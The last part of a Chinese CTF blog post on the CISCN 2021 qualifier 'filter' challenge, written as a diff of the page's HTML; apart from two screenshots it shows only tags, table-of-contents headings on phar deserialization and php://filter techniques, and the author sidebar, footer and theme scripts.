+<p><img src="/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-07_00-07-51.png"></p>
+<p>读取flag</p>
+<p><img src="/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-07_00-13-47.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># phar反序列化</a>
+              <a href="/tags/php-filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8/" rel="tag"># php://filter过滤器巧妙利用</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/08/01/DAS-x-CBCTF-%E9%83%A8%E5%88%86web-wp/" rel="prev" title="DAS x CBCTF 部分web wp">
+      <i class="fa fa-chevron-left"></i> DAS x CBCTF 部分web wp
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01"><span class="nav-number">1.</span> <span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-php-filter%E6%B8%85%E7%A9%BA%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="nav-number">2.</span> <span class="nav-text">0x02 php:&#x2F;&#x2F;filter清空文件内容</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E6%9E%84%E9%80%A0phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.</span> <span class="nav-text">0x03 构造phar触发反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%99%E5%87%BA%E4%B8%80%E4%B8%AA%E4%B8%8D%E5%AD%98%E5%9C%A8%E5%8F%82%E6%95%B0"><span class="nav-number">3.0.1.</span> <span class="nav-text">给出一个不存在参数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-%E6%9E%84%E9%80%A0payload%E8%A7%A3%E9%A2%98"><span class="nav-number">4.</span> <span class="nav-text">0x04 构造payload解题</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">nappingCat</p>
+  <div class="site-description" itemprop="description">2571374157@qq.com</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">46</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">nappingCat</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
